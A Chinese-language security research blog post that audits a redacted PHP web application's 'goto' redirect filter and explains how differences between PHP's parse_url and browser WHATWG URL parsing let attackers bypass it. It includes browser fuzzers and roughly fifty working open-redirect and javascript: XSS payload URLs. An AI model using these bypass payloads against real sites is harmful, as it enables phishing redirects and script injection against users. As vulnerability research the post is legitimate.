


[{"content":"","date":"17 March 2023","externalUrl":null,"permalink":"/categories/story/","section":"Categories","summary":"","title":"Story","type":"categories"},{"content":"2022年8月份在挖天融信SRC的时候，发现天融信的某个站点使用了redacted系统，于是便在github上下载了redacted的源码，审计了一下。\nSource \u0026amp; Sink # 通过审计发现，redacted系统在多处使用goto 参数来实现页面的重定向，比如说登录功能:\nhttp://demo.redacted.com/login?goto=/ 已经登录的用户如果访问该URL，后端将会读取goto参数的值，将其填充到twig模板中的div标签的自定义属性data-goto中:\n{% block content %} \u0026lt;div id=\u0026#34;page-message-container\u0026#34; class=\u0026#34;page-message-container\u0026#34; data-goto=\u0026#34;{{ goto }}\u0026#34; data-duration={{ duration }}\u0026gt; \u0026lt;div class=\u0026#34;page-message-panel\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;page-message-heading\u0026#34;\u0026gt; \u0026lt;h2 class=\u0026#34;page-message-title\u0026#34;\u0026gt;{{ title|trans }}\u0026lt;/h2\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;page-message-body\u0026#34;\u0026gt;{{ message|default(\u0026#39;\u0026#39;)|trans|raw }}\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {% endblock %} 之后前端通过如下js代码读取data-goto属性的值，通过window.location.href实现页面的跳转:\nfunction (e, t) { var n = $(\u0026#34;#page-message-container\u0026#34;), r = n.data(\u0026#34;goto\u0026#34;), o = n.data(\u0026#34;duration\u0026#34;); o \u0026gt; 0 \u0026amp;\u0026amp; r \u0026amp;\u0026amp; setTimeout((function () { window.location.href = r }), o) } Sanitizer/Filter # redacted为了防止在页面重定向的过程中出现开放重定向漏洞（OR）和XSS ，专门在后端写了一个过滤器，对goto参数中的URL进行过滤:\n/** * 过滤URL. * * 如果url不属于非本站域名下的，则返回本站首页地址。 * * @param $url string 待过滤的$url * * @return string */ public function filterRedirectUrl($url) { $host = $this-\u0026gt;get(\u0026#39;request_stack\u0026#39;)-\u0026gt;getCurrentRequest()-\u0026gt;getHost(); $safeHosts = [$host]; $parsedUrl = parse_url($url); $isUnsafeHost = isset($parsedUrl[\u0026#39;host\u0026#39;]) \u0026amp;\u0026amp; !in_array($parsedUrl[\u0026#39;host\u0026#39;], $safeHosts); $isInvalidUrl = isset($parsedUrl[\u0026#39;scheme\u0026#39;]) \u0026amp;\u0026amp; !in_array($parsedUrl[\u0026#39;scheme\u0026#39;], [\u0026#39;http\u0026#39;, \u0026#39;https\u0026#39;]); if (empty($url) || $isUnsafeHost || $isInvalidUrl) { $url = $this-\u0026gt;generateUrl(\u0026#39;homepage\u0026#39;, [], UrlGeneratorInterface::ABSOLUTE_URL); } return strip_tags($url); } 该 filter 的工作机制大致如下：\n拿到http请求报文中Host请求头，作为host白名单 设置协议白名单: http,https 使用PHP的URL解析器，来解析传入的URL，得到host部分和scheme部分 如果host部分和scheme部分存在，就判断host部分是否属于host白名单，scheme部分是否属于scheme白名单 否则就认为用户传入的是一个相对URL 绕过host检查 # 如何绕过filter的host检查呢？ 我想到了之前用来绕过 SSRF filter 的一个payload ：\nhttps://demo.redacted.com/login?goto=http://baidu.com\\@demo.redacted.com/ 这段payload 之所以可以成功，主要是利用了前后端URL解析器的不一致性：\nPHP的parse_url认为URL的host部分是demo.redacted.com ，与http请求报文中Host请求一致，所以通过了检查, 但是js的URL解析器却并不这样认为: js 的URL解析器会将 \\ 规范化为 / ，所以原来的payload 经过解析后就变成了: http://baidu.com/@demo.redacted.com/ 因此前端认为URL的host部分是baidu.com 。\n\u0026gt; new URL(\u0026#39;http://baidu.com\\\\@demo.redacted.com/\u0026#39;) URL {origin: \u0026#39;http://baidu.com\u0026#39;, protocol: \u0026#39;http:\u0026#39;, username: \u0026#39;\u0026#39;, password: \u0026#39;\u0026#39;, host: \u0026#39;baidu.com\u0026#39;, …} hash: \u0026#34;\u0026#34; host: \u0026#34;baidu.com\u0026#34; hostname: \u0026#34;baidu.com\u0026#34; href: \u0026#34;http://baidu.com/@demo.redacted.com/\u0026#34; origin: \u0026#34;http://baidu.com\u0026#34; password: \u0026#34;\u0026#34; pathname: \u0026#34;/@demo.redacted.com/\u0026#34; port: \u0026#34;\u0026#34; protocol: \u0026#34;http:\u0026#34; search: \u0026#34;\u0026#34; searchParams: URLSearchParams {} username: \u0026#34;\u0026#34; 绕过scheme检查 # 仅仅绕过host检查，我们只能造成一个开放重定向漏洞，想要造成xss，还需要绕过后端的协议检查，如何绕过后端的协议检查呢？\n我们可以尝试从如下思路来切入：因为漏洞的出现往往是由于程序的一些错误假设，所以我们可以尝试去寻找一下filter 有哪些错误的假设，然后尝试去打破它。\n$parsedUrl = parse_url($url); $isUnsafeHost = isset($parsedUrl[\u0026#39;host\u0026#39;]) \u0026amp;\u0026amp; ! in_array($parsedUrl[\u0026#39;host\u0026#39;], $safeHosts); $isInvalidUrl = isset($parsedUrl[\u0026#39;scheme\u0026#39;]) \u0026amp;\u0026amp; ! in_array($parsedUrl[\u0026#39;scheme\u0026#39;], [\u0026#39;http\u0026#39;, \u0026#39;https\u0026#39;]); if (empty($url) || $isUnsafeHost || $isInvalidUrl) { $url = $this-\u0026gt;generateUrl(\u0026#39;homepage\u0026#39;, [], UrlGeneratorInterface::ABSOLUTE_URL); } return strip_tags($url); 再次回看上面的那段filter代码，filter 假设：\n如果从URL中解析不到 host 和 scheme 部分，就一定是相对URL \u0026ldquo;相对URL\u0026quot;一定就是安全的。 那么如果我们让parse_url返回false会怎么样？\nfalse[\u0026#39;host\u0026#39;] === NULL false[\u0026#39;scheme\u0026#39;] === NULL parse_url 会认为用户传入的URL没有host和scheme部分，所以是一个相对URL!而相对URL一定是安全的，可以直接返回给前端。\n如何让parse_url返回false呢？\nPHP URL parser 只是对RFC标准的实现，所以一旦传入的URL不符合RFC规范，那么parse_url就会返回false\n比如一个经典的payload ，便可以用一种更简单的方式造成开放重定向:\nhttps://demo.redacted.com/login?goto=http:///baidu.com RFC 1738 规定:层级结构的绝对URL 除去协议部分，后续部分必须以 // 开头\nThe scheme specific data start with a double slash \u0026ldquo;//\u0026rdquo; to indicate that it complies with the common Internet scheme syntax.\n所以PHP 的URL解析器认为 http:///baidu.com 是一个非法的URL，因此直接返回了false，所以直接跳过了后续检查，返回给了前端。\n但是前端的URL解析器并不这么认为,它会将http:///baidu.com 规范化为http://baidu.com :\n\u0026gt; new URL(\u0026#39;http:///baidu.com\u0026#39;) URL {origin: \u0026#39;http://baidu.com\u0026#39;, protocol: \u0026#39;http:\u0026#39;, username: \u0026#39;\u0026#39;, password: \u0026#39;\u0026#39;, host: \u0026#39;baidu.com\u0026#39;, …} hash: \u0026#34;\u0026#34; host: \u0026#34;baidu.com\u0026#34; hostname: \u0026#34;baidu.com\u0026#34; href: \u0026#34;http://baidu.com/\u0026#34; origin: \u0026#34;http://baidu.com\u0026#34; password: \u0026#34;\u0026#34; pathname: \u0026#34;/\u0026#34; port: \u0026#34;\u0026#34; protocol: \u0026#34;http:\u0026#34; search: \u0026#34;\u0026#34; searchParams: URLSearchParams {} username: \u0026#34;\u0026#34; 所以造成了OR 漏洞。\n那么如果将http协议换成javascript 协议呢？RFC文档只是规定了层级URL必须包含//前缀，却没有明确说明: 如果非层级URL包含// 前缀，URL解析器应该如何处理。\njavascript:alert(1) javascript://alert(1) mailto:happyhacking@qq.com mailto://happyhacking@qq.com 于是我便想到了如下payload:\nhttps://demo.redacted.com/login?goto=javascript:///%250dalert(1) PHP 的URL解析器认为 javascript:///%250dalert(1) 是一个非法URL，直接返回了false，所以filter 跳过了协议检查，直接认为这就是一个安全的”相对URL“ 。\n但是前端的URL解析器有自己的想法：\n这行payload 反射到前端后是这样的\nwindow.location.href = \u0026#39;javascript:///%0dalert(1)\u0026#39; 前端的URL解析器先进行URL解码，将%0d解码为\\n ,解析到的协议名为javascript，因此切换为了js 解析器，js 解析器则认为// 是单行注释符，alert(1) 是换行后的下一行js代码。\n因此造成了XSS\n进一步的研究 # 能不能通过编写fuzzer来进一步搜索到js URL解析器和php URL解析器的更多不一致性呢?\nhttp:{char}//localhost:80/xxxx # 我们能否在 http: 和 //之间找到一个字符，将该字符填充到{char}位置之后，前端URL解析器仍然认为URL的host部分是localhost呢?\nfuzzer如下：\nlog=[]; for(i=0;i\u0026lt;0x10ffff;i++){ try{ let url = new URL(\u0026#39;http:\u0026#39;+String.fromCodePoint(i)+\u0026#39;//localhost:80/xxxx\u0026#39;) if(url[\u0026#39;host\u0026#39;] == \u0026#39;localhost\u0026#39; ){ console.log(i+\u0026#39;:URL encoded i : \u0026#39;+encodeURI(String.fromCodePoint(i))) log.push(i); } }catch(e){} } log 前端URL解析器的运行结果:\n9: URL encoded i : %09 debugger eval code:7:13-\u0026gt; \\t http:%09//localhost 10: URL encoded i : %0A debugger eval code:7:13-\u0026gt; http:%0a//localhost 13: URL encoded i : %0D debugger eval code:7:13-\u0026gt; http:%0d//localhost 47: URL encoded i : / debugger eval code:7:13 -\u0026gt; http:///localhost 92: URL encoded i : %5C \\ -\u0026gt; http:\\//localhost 那么PHP的URL解析器是如何解析的呢？\n[\u0026#34;http:%09//localhost\u0026#34;]=\u0026gt; array(2) { [\u0026#34;scheme\u0026#34;]=\u0026gt; string(4) \u0026#34;http\u0026#34; [\u0026#34;path\u0026#34;]=\u0026gt; string(14) \u0026#34;%09//localhost\u0026#34; } [\u0026#34;http: //localhost\u0026#34;]=\u0026gt; array(2) { [\u0026#34;scheme\u0026#34;]=\u0026gt; string(4) \u0026#34;http\u0026#34; [\u0026#34;path\u0026#34;]=\u0026gt; string(14) \u0026#34; //localhost\u0026#34; } [\u0026#34;http:%0a//localhost\u0026#34;]=\u0026gt; array(2) { [\u0026#34;scheme\u0026#34;]=\u0026gt; string(4) \u0026#34;http\u0026#34; [\u0026#34;path\u0026#34;]=\u0026gt; string(14) \u0026#34;%0a//localhost\u0026#34; } [\u0026#34;http:\\//localhost\u0026#34;]=\u0026gt; array(2) { [\u0026#34;scheme\u0026#34;]=\u0026gt; string(4) \u0026#34;http\u0026#34; [\u0026#34;path\u0026#34;]=\u0026gt; string(12) \u0026#34;\\//localhost\u0026#34; } [\u0026#34;http:///localhost\u0026#34;]=\u0026gt; bool(false) 由此可见，PHP URL解析器面对这些payload的时候，要么会认为http:之后的都是path部分，要么直接认为该URL是一个非法的URL，从而返回了false\n换句话说，以下payload 也可以绕过redacted 的filter ，导致开放重定向:\nhttps://demo.redacted.com/login?goto=http:\\//www.baidu.com https://demo.redacted.com/login?goto=http:%0d\\\\www.baidu.com https://demo.redacted.com/login?goto=http:%0a\\\\www.baidu.com https://demo.redacted.com/login?goto=http:%09\\\\www.baidu.com http{char}://localhost:80/xxxx # 我们能否在 http 和 ://之间找到一个字符，加入该字符后仍然可以让前端URL解析器认为URL的host部分是localhost且scheme部分是http呢?\nfuzzer:\nlog=[]; for(i=0;i\u0026lt;0x10ffff;i++){ try{ let url = new URL(\u0026#39;http\u0026#39;+String.fromCodePoint(i)+\u0026#39;://localhost:80/xxxx\u0026#39;) if(url[\u0026#39;host\u0026#39;] == \u0026#39;localhost\u0026#39; \u0026amp;\u0026amp; url[\u0026#39;protocol\u0026#39;] == \u0026#39;http:\u0026#39;){ console.log(\u0026#39;i: \u0026#39;+i+\u0026#39; URL encoded i : \u0026#39;+encodeURI(String.fromCodePoint(i))); console.log(url); log.push(i); } }catch(e){} } log 前端URL解析器的运行结果:\nVM437:7 9: URL encoded i : %09 VM437:7 10: URL encoded i : %0A VM437:7 13: URL encoded i : %0D 这次只得到了三个字符，没有了 / 和 \\ ，得到如下3个payload\nhttp%09://baidu.com http%0a://baidu.com http%0d://baidu.com PHP的URL解析器是如何解析的呢?\n[\u0026#34;http%09://localhost:80/xxx\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(26) \u0026#34;http%09://localhost:80/xxx\u0026#34; } [\u0026#34;http%0a://localhost:80/xxx\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(26) \u0026#34;http%0a://localhost:80/xxx\u0026#34; } [\u0026#34;http%0d://localhost:80/xxx\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(26) \u0026#34;http%0d://localhost:80/xxx\u0026#34; } PHP 直接认为整个URL 都是path 部分，即认为整个URL就是一个相对URL\n这样一来，同时绕过了filter的协议检查和host检查:\nwindow.location.href=\u0026#39;http\\n://localhost:80/xxx\u0026#39; //成功！ window.location.href=\u0026#39;javascript\\n:alert(1)\u0026#39; //成功! window.location.href=\u0026#39;javascript\\r:alert(1)\u0026#39; //成功！ window.location.href=\u0026#39;javascript\\t:alert(1)\u0026#39; //成功！ payload:\nhttps://demo.redacted.com/login?goto=javascript%0d:alert(1) //成功！ https://demo.redacted.com/login?goto=javascript%0a:alert(1) //成功！ https://demo.redacted.com/login?goto=javascript%09:alert(1) //成功！ https://demo.redacted.com/login?goto=http%09://baidu.com //成功 {char}http://localhost:80/xxxx # 能否在 http协议之前找到一个字符，填充进去后，仍然可以让前端URL解析器认为URL的host部分是localhost且scheme部分是http呢?\nlog=[]; for(i=0;i\u0026lt;0x10ffff;i++){ try{ let url = new URL(String.fromCodePoint(i)+\u0026#39;http://localhost:80/xxxx\u0026#39;) if(url[\u0026#39;host\u0026#39;] == \u0026#39;localhost\u0026#39; \u0026amp;\u0026amp; url[\u0026#39;protocol\u0026#39;] == \u0026#39;http:\u0026#39;){ console.log(`i: ${i} ,URL encoded i : `+encodeURI(String.fromCodePoint(i))+\u0026#39; string begin:\u0026#39;+String.fromCodePoint(i)+\u0026#39;string end\u0026#39;) log.push(i); } }catch(e){} } log log.forEach(i=\u0026gt;{ //console.log(encodeURI(String.fromCodePoint(i))+\u0026#39;http://localhost:80/xxxx\u0026#39;) console.log(encodeURI(String.fromCodePoint(i))+\u0026#39;javascript:alert(1)\u0026#39;) }) 生成了如下payload:\n%00http://localhost:80/xxxx %01http://localhost:80/xxxx %02http://localhost:80/xxxx %03http://localhost:80/xxxx %04http://localhost:80/xxxx %05http://localhost:80/xxxx %06http://localhost:80/xxxx %07http://localhost:80/xxxx %08http://localhost:80/xxxx %09http://localhost:80/xxxx %0Ahttp://localhost:80/xxxx %0Bhttp://localhost:80/xxxx %0Chttp://localhost:80/xxxx %0Dhttp://localhost:80/xxxx %0Ehttp://localhost:80/xxxx %0Fhttp://localhost:80/xxxx %10http://localhost:80/xxxx %11http://localhost:80/xxxx %12http://localhost:80/xxxx %13http://localhost:80/xxxx %14http://localhost:80/xxxx %15http://localhost:80/xxxx %16http://localhost:80/xxxx %17http://localhost:80/xxxx %18http://localhost:80/xxxx %19http://localhost:80/xxxx %1Ahttp://localhost:80/xxxx %1Bhttp://localhost:80/xxxx %1Chttp://localhost:80/xxxx %1Dhttp://localhost:80/xxxx %1Ehttp://localhost:80/xxxx %1Fhttp://localhost:80/xxxx %20http://localhost:80/xxxx 将http协议替换为javascript协议:\n%00javascript:alert(1) %01javascript:alert(1) %02javascript:alert(1) %03javascript:alert(1) %04javascript:alert(1) %05javascript:alert(1) %06javascript:alert(1) %07javascript:alert(1) %08javascript:alert(1) %09javascript:alert(1) %0Ajavascript:alert(1) %0Bjavascript:alert(1) %0Cjavascript:alert(1) %0Djavascript:alert(1) %0Ejavascript:alert(1) %0Fjavascript:alert(1) %10javascript:alert(1) %11javascript:alert(1) %12javascript:alert(1) %13javascript:alert(1) %14javascript:alert(1) %15javascript:alert(1) %16javascript:alert(1) %17javascript:alert(1) %18javascript:alert(1) %19javascript:alert(1) %1Ajavascript:alert(1) %1Bjavascript:alert(1) %1Cjavascript:alert(1) %1Djavascript:alert(1) %1Ejavascript:alert(1) %1Fjavascript:alert(1) %20javascript:alert(1) PHP 的URL解析器是如何解析的呢？\n[\u0026#34;%00http://localhost:80/xxxx\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(27) \u0026#34;%00http://localhost:80/xxxx\u0026#34; } [\u0026#34;%01http://localhost:80/xxxx\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(27) \u0026#34;%01http://localhost:80/xxxx\u0026#34; } [\u0026#34;%1Djavascript:alert(1)\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(22) \u0026#34;%1Djavascript:alert(1)\u0026#34; } [\u0026#34;%1Ejavascript:alert(1)\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(22) \u0026#34;%1Ejavascript:alert(1)\u0026#34; } PHP 的URL解析器认为整个URL就是一个相对URL\n所以以下payload 都可以绕过redacted filter 的协议检查和host检查:\nhttps://demo.redacted.com/login?goto=%00javascript:alert(1) https://demo.redacted.com/login?goto=%01javascript:alert(1) https://demo.redacted.com/login?goto=%02javascript:alert(1) https://demo.redacted.com/login?goto=%03javascript:alert(1) https://demo.redacted.com/login?goto=%04javascript:alert(1) https://demo.redacted.com/login?goto=%05javascript:alert(1) https://demo.redacted.com/login?goto=%06javascript:alert(1) https://demo.redacted.com/login?goto=%07javascript:alert(1) https://demo.redacted.com/login?goto=%08javascript:alert(1) https://demo.redacted.com/login?goto=%09javascript:alert(1) https://demo.redacted.com/login?goto=%0Ajavascript:alert(1) https://demo.redacted.com/login?goto=%0Bjavascript:alert(1) https://demo.redacted.com/login?goto=%0Cjavascript:alert(1) https://demo.redacted.com/login?goto=%0Djavascript:alert(1) https://demo.redacted.com/login?goto=%0Ejavascript:alert(1) https://demo.redacted.com/login?goto=%0Fjavascript:alert(1) https://demo.redacted.com/login?goto=%10javascript:alert(1) https://demo.redacted.com/login?goto=%11javascript:alert(1) https://demo.redacted.com/login?goto=%12javascript:alert(1) https://demo.redacted.com/login?goto=%13javascript:alert(1) https://demo.redacted.com/login?goto=%14javascript:alert(1) https://demo.redacted.com/login?goto=%15javascript:alert(1) https://demo.redacted.com/login?goto=%16javascript:alert(1) https://demo.redacted.com/login?goto=%17javascript:alert(1) https://demo.redacted.com/login?goto=%18javascript:alert(1) https://demo.redacted.com/login?goto=%19javascript:alert(1) https://demo.redacted.com/login?goto=%1Ajavascript:alert(1) https://demo.redacted.com/login?goto=%1Bjavascript:alert(1) https://demo.redacted.com/login?goto=%1Cjavascript:alert(1) https://demo.redacted.com/login?goto=%1Djavascript:alert(1) https://demo.redacted.com/login?goto=%1Ejavascript:alert(1) https://demo.redacted.com/login?goto=%1Fjavascript:alert(1) https://demo.redacted.com/login?goto=%20javascript:alert(1) ht{char}tp://localhost:80/xxxx # 让我们的想法再大胆一点，能否在ht和tp之间找到一种字符，让前端的URL解析器仍然认为URL的scheme部分是http且host部分是localhost\nfuzz 程序如下:\nlog=[]; for(i=0;i\u0026lt;0x10ffff;i++){ try{ let url = new URL(\u0026#39;ht\u0026#39;+String.fromCodePoint(i)+\u0026#39;tp://localhost:80/xxxx\u0026#39;) if(url[\u0026#39;host\u0026#39;] == \u0026#39;localhost\u0026#39; \u0026amp;\u0026amp; url[\u0026#39;protocol\u0026#39;] == \u0026#39;http:\u0026#39;){ console.log(\u0026#39;i: \u0026#39;+i+\u0026#39; URL encoded i : \u0026#39;+encodeURI(String.fromCodePoint(i))); console.log(url); log.push(i); } }catch(e){} } log 运行结果:\ni: 9 URL encoded i : %09 debugger eval code:6:13 URL { href: \u0026#34;http://localhost/xxxx\u0026#34;, origin: \u0026#34;http://localhost\u0026#34;, protocol: \u0026#34;http:\u0026#34;, username: \u0026#34;\u0026#34;, password: \u0026#34;\u0026#34;, host: \u0026#34;localhost\u0026#34;, hostname: \u0026#34;localhost\u0026#34;, port: \u0026#34;\u0026#34;, pathname: \u0026#34;/xxxx\u0026#34;, search: \u0026#34;\u0026#34; } debugger eval code:7:13 i: 10 URL encoded i : %0A debugger eval code:6:13 URL { href: \u0026#34;http://localhost/xxxx\u0026#34;, origin: \u0026#34;http://localhost\u0026#34;, protocol: \u0026#34;http:\u0026#34;, username: \u0026#34;\u0026#34;, password: \u0026#34;\u0026#34;, host: \u0026#34;localhost\u0026#34;, hostname: \u0026#34;localhost\u0026#34;, port: \u0026#34;\u0026#34;, pathname: \u0026#34;/xxxx\u0026#34;, search: \u0026#34;\u0026#34; } debugger eval code:7:13 i: 13 URL encoded i : %0D debugger eval code:6:13 URL { href: \u0026#34;http://localhost/xxxx\u0026#34;, origin: \u0026#34;http://localhost\u0026#34;, protocol: \u0026#34;http:\u0026#34;, username: \u0026#34;\u0026#34;, password: \u0026#34;\u0026#34;, host: \u0026#34;localhost\u0026#34;, hostname: \u0026#34;localhost\u0026#34;, port: \u0026#34;\u0026#34;, pathname: \u0026#34;/xxxx\u0026#34;, search: \u0026#34;\u0026#34; } debugger eval code:7:13 Array(3) [ 9, 10, 13 ] 得到了如下payload\nht%0dtp://localhost ht%0atp://localhost ht%09tp://localhost java%09script:alert(1) java%0dscript:alert(1) java%0ascript:alert(1) 那么PHP的URL解析器是如何处理这些畸形URL的呢?\n[\u0026#34;ht%0dtp://localhost\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(19) \u0026#34;ht%0dtp://localhost\u0026#34; } [\u0026#34;ht%0atp://localhost\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(19) \u0026#34;ht%0atp://localhost\u0026#34; } [\u0026#34;ht%09tp://localhost\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(19) \u0026#34;ht%09tp://localhost\u0026#34; } [\u0026#34;java%09script:alert(1)\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(22) \u0026#34;java%09script:alert(1)\u0026#34; } [\u0026#34;java%0dscript:alert(1)\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(22) \u0026#34;java%0dscript:alert(1)\u0026#34; } [\u0026#34;java%0ascript:alert(1)\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(22) \u0026#34;java%0ascript:alert(1)\u0026#34; } PHP 的URL解析器再一次地认为这些URL都是\u0026rsquo;规范的\u0026rsquo;相对URL，全部通过了redacted fitler的检查\nhttps://demo.redacted.com/login?goto=ht%0dtp://baidu.com https://demo.redacted.com/login?goto=ht%0atp://baidu.com https://demo.redacted.com/login?goto=ht%09tp://baidu.com https://demo.redacted.com/login?goto=java%09script:alert(1) https://demo.redacted.com/login?goto=java%0dscript:alert(1) https://demo.redacted.com/login?goto=java%0ascript:alert(1) 实际上这三种字符可以放在scheme的任意位置:\nhttps://demo.redacted.com/login?goto=java%0asc%0aript:alert(1) 汇总 # 通过对javascript URL parser 与php URL parser不一致性的进一步研究，我一共找到了四十几种绕过redacted filter 的方法：\nhttps://demo.redacted.com/login?goto=http://baidu.com\\@demo.redacted.com/ https://demo.redacted.com/login?goto=javascript:///%250dalert(1) https://demo.redacted.com/login?goto=http:///www.baidu.com https://demo.redacted.com/login?goto=http:\\//www.baidu.com https://demo.redacted.com/login?goto=http:%0d\\\\www.baidu.com https://demo.redacted.com/login?goto=http:%0a\\\\www.baidu.com https://demo.redacted.com/login?goto=http:%09\\\\www.baidu.com https://demo.redacted.com/login?goto=javascript%0d:alert(1) https://demo.redacted.com/login?goto=javascript%0a:alert(1) https://demo.redacted.com/login?goto=javascript%09:alert(1) https://demo.redacted.com/login?goto=http%09://baidu.com https://demo.redacted.com/login?goto=%00javascript:alert(1) https://demo.redacted.com/login?goto=%01javascript:alert(1) https://demo.redacted.com/login?goto=%02javascript:alert(1) https://demo.redacted.com/login?goto=%03javascript:alert(1) https://demo.redacted.com/login?goto=%04javascript:alert(1) https://demo.redacted.com/login?goto=%05javascript:alert(1) https://demo.redacted.com/login?goto=%06javascript:alert(1) https://demo.redacted.com/login?goto=%07javascript:alert(1) https://demo.redacted.com/login?goto=%08javascript:alert(1) https://demo.redacted.com/login?goto=%09javascript:alert(1) https://demo.redacted.com/login?goto=%0Ajavascript:alert(1) https://demo.redacted.com/login?goto=%0Bjavascript:alert(1) https://demo.redacted.com/login?goto=%0Cjavascript:alert(1) https://demo.redacted.com/login?goto=%0Djavascript:alert(1) https://demo.redacted.com/login?goto=%0Ejavascript:alert(1) https://demo.redacted.com/login?goto=%0Fjavascript:alert(1) https://demo.redacted.com/login?goto=%10javascript:alert(1) https://demo.redacted.com/login?goto=%11javascript:alert(1) https://demo.redacted.com/login?goto=%12javascript:alert(1) https://demo.redacted.com/login?goto=%13javascript:alert(1) https://demo.redacted.com/login?goto=%14javascript:alert(1) https://demo.redacted.com/login?goto=%15javascript:alert(1) https://demo.redacted.com/login?goto=%16javascript:alert(1) https://demo.redacted.com/login?goto=%17javascript:alert(1) https://demo.redacted.com/login?goto=%18javascript:alert(1) https://demo.redacted.com/login?goto=%19javascript:alert(1) https://demo.redacted.com/login?goto=%1Ajavascript:alert(1) https://demo.redacted.com/login?goto=%1Bjavascript:alert(1) https://demo.redacted.com/login?goto=%1Cjavascript:alert(1) https://demo.redacted.com/login?goto=%1Djavascript:alert(1) https://demo.redacted.com/login?goto=%1Ejavascript:alert(1) https://demo.redacted.com/login?goto=%1Fjavascript:alert(1) https://demo.redacted.com/login?goto=%20javascript:alert(1) https://demo.redacted.com/login?goto=ht%0dtp://baidu.com https://demo.redacted.com/login?goto=ht%0atp://baidu.com https://demo.redacted.com/login?goto=ht%09tp://baidu.com https://demo.redacted.com/login?goto=java%09script:alert(1) https://demo.redacted.com/login?goto=java%0dscript:alert(1) https://demo.redacted.com/login?goto=java%0ascript:alert(1) https://demo.redacted.com/login?goto=java%0asc%0aript:alert(1) 根本原因 # 为什么javascript URL parser与PHP URL parser之间存在这么大的不一致性?\n因为这个世界上存在两种URL解析标准：RFC标准和WHATWG标准，WHATWG 组织在参考RFC标准的基础上，自己制定了一套标准: URL parsing 浏览器端javascript URL parser遵循了WHATWG标准，而PHP URL parser 遵循了RFC规范, Node.js 则同时提供了两种URL解析器，分别是 url.parse 和 new URL ，前者遵循RFC标准，后者遵循WHATWG标准。\nWHATWG URL parsing 标准中是这么说的:\nIf input contains any leading or trailing C0 control or space, validation error. Remove any leading and trailing C0 control or space from input. 如果说输入的URL开头和结尾有C0 控制符和space，则报一个 validtion error,然后删除输入中给所有开头和结尾的 C0 控制符 和 space ，其中 C0 control 的范围是: 0x00-0x1F ,space 的范围是 0x20 ，所以C0 control + space的范围是 0x00-0x20\n什么叫 validation error ，标准是这么说:\nA validation error indicates a mismatch between input and valid input. User agents, especially conformance checkers, are encouraged to report them somewhere.A validation error does not mean that the parser terminates. Termination of a parser is always stated explicitly, e.g., through a return statement.\nvalidtion error 只是表示输入和有效输入之间的不匹配，并不意味着解析终止，标准鼓励实现者在某处报告它。\n这就是为什么以下这些payload可以工作:\nhttps://demo.redacted.com/login?goto=%00javascript:alert(1) https://demo.redacted.com/login?goto=%01javascript:alert(1) https://demo.redacted.com/login?goto=%02javascript:alert(1) ... https://demo.redacted.com/login?goto=%20javascript:alert(1) 然后这套标准又这么说:\nIf input contains any ASCII tab or newline, validation error. Remove all ASCII tab or newline from input. 那么ASCII tab or newline 范围有多大?\nAn ASCII tab or newline is U+0009 TAB, U+000A LF, or U+000D CR.\n所以下面这些payload中%0d %0a %09都会被javascript URL parser给删除掉\nhttps://demo.redacted.com/login?goto=ht%0dtp://baidu.com https://demo.redacted.com/login?goto=ht%0atp://baidu.com https://demo.redacted.com/login?goto=ht%09tp://baidu.com https://demo.redacted.com/login?goto=java%09script:alert(1) https://demo.redacted.com/login?goto=java%0dscript:alert(1) https://demo.redacted.com/login?goto=java%0ascript:alert(1) https://demo.redacted.com/login?goto=java%0asc%0aript:alert(1) 换句话说，%0d %0a %09 这三个字符可以放在URL的任何位置来对URL进行混淆，反正javascript URL parser 会删除掉这些字符,比如\nnew URL(\u0026#39;http:/\\x09/baidu.com\u0026#39;) URL { origin: \u0026#39;http://baidu.com\u0026#39;, protocol: \u0026#39;http:\u0026#39;, username: \u0026#39;\u0026#39;, password: \u0026#39;\u0026#39;, host: \u0026#39;baidu.com\u0026#39; } 总结 # 世界上最糟糕的事莫过于对于同一事物有两套标准，如果标准存在不一致性，那么实现必然存在不一致性。不一致性导致的安全问题是隐蔽的，因为当你审计单个系统的时候，你会认为没有安全问题，但是当你把多个系统连接起来协同工作的时候，安全问题就会出现。这也说明了审计安全问题，需要从全局出发来统筹考虑，不能只是审计单个系统。\n同时值得注意的是,凡是标准和规范没有明确规定或者模棱两可的地方，实现标准的开发者之间就会存在理解偏差，进而导致各种遵循标准实现的语言、库、框架、软件之间出现不一致性，这种不一致性便是创造新的攻击技术的沃土。\n+----------------------------------------------------+ | 存在两套标准/标准的模棱两可/标准没有明确规定/标准的不同版本 | +----------------------------------------------------+ | v +-------------------+ | 实现的不一致性 | +-------------------+ | v +------------------------------------+ | 各种bypass trick/新的攻击技术 | +------------------------------------+ Keep in touch # 如果你有好的想法或者其他疑问，可以发送邮件给我:\nEmail: hdrw1024@gmail.com Twitter: https://twitter.com/RuiShang9 Medium: https://medium.com/@hdrw1024 Blog: https://shangrui-hash.github.io/en/ Github: https://github.com/ShangRui-hash 微信公众号: 参考资料 # whatwg - C0 control 标准 whatwg - URL parsing 标准 whatwg - validation error A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! EXPLOITING URL PARSERS: THE GOOD, BAD, AND INCONSISTENT HOW FRCKN\u0026rsquo; HARD IS IT TO UNDERSTAND A URL?! - uXSS CVE-2018-6128 How did Masato find the Google Search XSS? Fuzzing Browsers for weird XSS Vectors 2017/Daniel Stenberg/ONE URL STANDARD PLEASE 2022/Daniel 